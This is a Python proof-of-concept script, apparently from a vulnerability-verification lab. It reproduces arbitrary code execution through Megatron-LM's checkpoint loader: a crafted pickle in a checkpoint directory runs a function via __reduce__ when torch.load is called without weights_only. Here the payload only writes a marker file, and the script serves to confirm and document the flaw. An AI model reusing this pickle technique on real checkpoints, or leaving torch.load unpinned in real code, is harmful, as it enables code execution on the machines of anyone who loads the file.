"""megatron-checkpointing-py-torch-load-any-l1739-regex dynamic reproduction (Megatron-LM core_v0.19.2 checkpoint loader).

The pinned upstream ``megatron/training/checkpointing.py`` is executed verbatim;
``megatron.*`` siblings and the filesystem facade ``maybe_msc`` are stubbed via
``lab.upstream_verify.stublib`` because megatron-core 0.19.x cannot be imported
on a Windows/CPU host (its MoE ops hard-import ``triton``).  ``torch`` is real,
and the sink is the real upstream ``torch.load(checkpoint_name,
map_location='cpu')`` call, which does not pin ``weights_only`` - so torch 2.5.x
deserialises arbitrary pickle.

Vulnerable path: a checkpoint directory whose ``latest_checkpointed_iteration.txt``
points at an attacker-supplied ``iter_*/mp_rank_00/model_optim_rng.pt`` pickle.
"""

from __future__ import annotations

import glob
import json
import os
import pickle
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402

CASE_ENTRY = '_load_base_checkpoint'


class _Store(dict):
    """state dict that answers the keys the loader asks for."""

    def __missing__(self, key):
        value = {"state": [{"step": 1}], "param_groups": [{}]}
        dict.__setitem__(self, key, value)
        return value


def _materialize(marker_path: str, marker_text: str, output):
    """Runs inside torch.load(); this is the code-execution primitive."""
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return output


class _Payload:
    def __init__(self, marker_path: str, marker_text: str, output):
        self.marker_path = marker_path
        self.marker_text = marker_text
        self.output = output

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text, self.output))


def _mpu() -> types.SimpleNamespace:
    return types.SimpleNamespace(
        get_data_parallel_rank=lambda: 0,
        get_pipeline_model_parallel_world_size=lambda: 1,
        get_tensor_model_parallel_rank=lambda: 0,
        get_pipeline_model_parallel_rank=lambda: 0,
        get_expert_model_parallel_world_size=lambda: 1,
        get_expert_model_parallel_rank=lambda: 0,
        get_data_parallel_world_size=lambda: 1,
    )


def main() -> None:
    import torch

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    tree = StubTree(["megatron"]).install()
    tree.seed(
        "megatron.core.msc_utils",
        maybe_msc=types.SimpleNamespace(
            open=open,
            Path=Path,
            os=os,
            makedirs=os.makedirs,
            glob=glob.glob,
        ),
    )
    tree.seed("megatron.core", mpu=_mpu())
    tree.seed("megatron.training")
    module = tree.load(source, "megatron.training.checkpointing")

    poclib.start_marker("ABSENT")
    marker = str(poclib.MARKER_FILE)
    text = poclib.MARKER_TEXT

    root = poclib.EVIDENCE_DIR / "checkpoint"
    if root.exists():
        import shutil

        shutil.rmtree(root)
    (root / "iter_0000001" / "mp_rank_00").mkdir(parents=True)
    (root / "latest_checkpointed_iteration.txt").write_text("1", encoding="utf-8")
    ckpt_file = root / "iter_0000001" / "mp_rank_00" / "model_optim_rng.pt"

    torch.distributed.get_rank = lambda *a, **k: 0
    torch.distributed.barrier = lambda *a, **k: None

    sink_error = None
    result = None
    if CASE_ENTRY == "load_biencoder_checkpoint":
        (ckpt_file).write_bytes(
            pickle.dumps(_Payload(marker, text, {"model": [types.SimpleNamespace()]}), protocol=4)
        )
        module.get_args = lambda: types.SimpleNamespace(load=str(root), use_distributed_optimizer=False)
        module.unwrap_model = lambda model: model
        model = [types.SimpleNamespace(load_state_dict=lambda state: None)]
        try:
            result = module.load_biencoder_checkpoint(model, custom_load_path=str(root))
        except Exception as exc:
            sink_error = f"{type(exc).__name__}: {exc}"
    else:
        (ckpt_file).write_bytes(
            pickle.dumps(_Payload(marker, text, _Store()), protocol=4)
        )
        args = types.SimpleNamespace(
            non_persistent_global_ckpt_dir=None,
            non_persistent_ckpt_type=None,
            ckpt_step=None,
            exit_on_missing_checkpoint=False,
            ckpt_format="torch",
            use_megatron_fsdp=False,
        )
        try:
            result = module._load_base_checkpoint(str(root), args, rank0=True)
        except SystemExit as exc:
            sink_error = f"SystemExit({exc.code})"
        except Exception as exc:
            sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written by the upstream torch.load sink", sink_error=sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+torch.load",
                "entrypoint": "megatron.training.checkpointing._load_base_checkpoint",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink": "torch.load(checkpoint_name, map_location='cpu')  # weights_only unpinned",
                "torch_version": torch.__version__,
                "checkpoint_file": poclib.rel(ckpt_file),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": sink_error,
                "result_type": type(result).__name__,
                "version_pair_note": "torch 2.5.1 keeps weights_only=False by default; torch>=2.6 blocks this pickle",
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            },
            "request_response": [
                {
                    "dir": "untrusted checkpoint dir -> torch.load(weights_only=False)",
                    "payload": "pickle reduce",
                    "result": "marker written inside torch.load",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
